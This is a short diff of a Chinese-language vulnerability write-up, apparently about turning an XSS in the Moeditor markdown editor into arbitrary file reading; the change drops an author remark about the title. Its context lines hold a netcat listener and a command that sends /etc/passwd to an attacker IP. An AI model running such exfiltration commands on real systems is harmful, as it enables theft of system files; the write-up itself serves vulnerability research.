@@ -105,8 +105,7 @@ nc -l -p 1337
 nc -w 3 192.168.202.129 1337 < /etc/passwd
 ```
 攻击机上收到命令执行后的输出，如下图  
-![image](./pic/a.png)  
-目前为止，实现的是任意文件读取，个人觉得，标题叫做“从XSS到任意文件读取”更合适
+![image](./pic/a.png)
 
 Ubuntu18.04.2_x64下安装https://moeditor.js.org/  
 Kali-2020.4-vmware-amd64下执行：nc -l -p 1337，如下图  
